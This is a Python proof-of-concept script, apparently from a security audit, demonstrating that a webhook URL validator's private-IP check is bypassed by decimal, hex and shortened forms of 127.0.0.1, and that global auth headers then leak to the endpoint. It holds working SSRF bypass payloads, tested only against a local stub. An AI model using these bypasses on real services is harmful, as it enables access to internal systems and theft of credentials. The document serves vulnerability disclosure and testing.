"""PoC-05: Private-IP check in validate_webhook_url bypassed by decimal/hex IPs.

Root cause (validators.py:122-128):
    try:
        ip = ipaddress.ip_address(host_bare)   # only parses CANONICAL form
    except ValueError:
        pass
    if ip is not None and _is_internal_ip(ip):
        raise ValidationError(...)

ipaddress.ip_address("2130706433") raises ValueError → ip stays None → private-IP
check is SKIPPED.  But curl (via the OS resolver) treats decimal notation as a
valid IP:  2130706433 == 0x7F000001 == 127.0.0.1.

Bonus: because run() prepends global auth headers to every curl call,
the target's Bearer token also reaches this "private" webhook endpoint.

Tested bypass forms (all resolve to 127.0.0.1 on Linux):
  - http://2130706433/        (32-bit decimal)
  - http://0x7f000001/        (hex)
  - http://127.1/             (octet-elision)

Local demo: stub on 127.0.0.1, no external traffic.
"""
import ipaddress
import sys
from pathlib import Path

ROOT = Path(__file__).resolve().parents[2]
if str(ROOT) not in sys.path:
    sys.path.insert(0, str(ROOT))

from _common import Recorder, report      # noqa: E402
from scanner import utils                 # noqa: E402
from scanner.validators import validate_webhook_url, ValidationError  # noqa: E402

BEARER = "VICTIM-BEARER-5e3b"
COOKIE = "sid=VICTIM-SESSION-d2f1"

BYPASS_FORMS = [
    "2130706433",      # decimal 127.0.0.1
    "0x7f000001",      # hex
    "127.1",           # octet-elision
]


def main() -> int:
    stub = Recorder()
    PORT = stub.port
    results = []

    utils.set_auth(bearer=BEARER, cookie=COOKIE)
    try:
        for form in BYPASS_FORMS:
            url = f"http://{form}:{PORT}/webhook"
            # 1. validate_webhook_url must NOT raise
            try:
                validated = validate_webhook_url(url)
                validation_passed = True
            except ValidationError:
                validation_passed = False
                results.append((form, False, False, False))
                continue

            # 2. Python ipaddress confirms the bypass mechanism
            try:
                parsed_ip = ipaddress.ip_address(form)
                ip_is_private = True  # would have been caught if parsed
            except ValueError:
                ip_is_private = False  # ← this is the gap

            # 3. curl actually connects to 127.0.0.1:PORT
            stub.last = {}
            utils.run(["curl", "-s", "--max-time", "5", validated], timeout=8)
            stub_hit   = bool(stub.last)
            auth_seen  = BEARER in stub.last.get("headers", {}).get("authorization", "")
            results.append((form, validation_passed, stub_hit, auth_seen))
    finally:
        utils.set_auth()
        stub.close()

    # All forms must: pass validation, reach the stub, and leak auth.
    confirmed = all(v and h and a for _, v, h, a in results)
    detail_lines = [
        f"{form}: validate_ok={v} stub_hit={h} auth_leaked={a}"
        for form, v, h, a in results
    ]
    detail = " | ".join(detail_lines)
    return report(
        "PoC-05",
        "webhook private-IP check bypassed by decimal/hex IP; auth token leaked",
        confirmed, detail,
    )


if __name__ == "__main__":
    raise SystemExit(main())
